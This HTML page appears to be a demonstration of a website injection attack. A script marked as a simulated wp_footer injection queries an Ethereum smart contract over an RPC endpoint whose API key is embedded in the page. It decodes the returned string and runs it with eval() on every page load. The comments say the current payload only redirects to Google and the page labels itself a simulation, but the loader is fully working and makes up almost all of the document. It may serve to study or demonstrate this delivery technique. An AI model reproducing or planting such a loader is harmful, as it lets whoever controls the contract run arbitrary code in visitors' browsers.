<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Normal Business Website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        h1 { color: #333; }
        p  { color: #666; line-height: 1.6; }
        #status {
            margin-top: 20px;
            padding: 10px;
            background: #f5f5f5;
            border-radius: 4px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

    <h1>Welcome to Yahud Injection Website</h1>
    <p>We provide professional services to our clients worldwide.</p>
    <p>Contact us at info@yahudcorp.com for more information.</p>

    <!-- Status div so you can see what's happening -->
    <div id="status">Loading...</div>

    <!-- SIMULATED wp_footer INJECTION -->
    <script>
    (function() {
        var CONTRACT_ADDRESS = "0x3d0a8C3FCc4494614936A2CC9AE2EfaA9C380A91";
        var RPC_URL          = "https://eth-sepolia.g.alchemy.com/v2/alch_CW94ke6cHjFLgV7QPFfZJ";
        var SELECTOR         = "0x2cae8ae4"; // getPayload() selector

        var status = document.getElementById("status");
        status.textContent = "Fetching from blockchain...";

        function decodeABIString(hexResult) {
            var hex    = hexResult.slice(2);
            var length = parseInt(hex.slice(64, 128), 16);
            var strHex = hex.slice(128, 128 + length * 2);
            var bytes  = strHex.match(/.{2}/g).map(function(b) {
                return parseInt(b, 16);
            });
            return String.fromCharCode.apply(null, bytes);
        }

        fetch(RPC_URL, {
            method:  "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                jsonrpc: "2.0",
                method:  "eth_call",
                params:  [{
                    to:   CONTRACT_ADDRESS,
                    data: SELECTOR
                }, "latest"],
                id: 1
            })
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var payload = decodeABIString(data.result);

            // Show in status div before executing
            status.textContent = "Payload received: " + payload;
            console.log("[SIMULATION] Payload:", payload);

            // Small delay so you can see the status update
            // before the redirect happens
            setTimeout(function() {
                eval(payload); // executes: window.location.href='https://www.google.com'
            }, 2000);
        })
        .catch(function(err) {
            status.textContent = "Error: " + err.message;
            console.error("[SIMULATION] Fetch failed:", err);
        });

    })();
    </script>

</body>
</html>
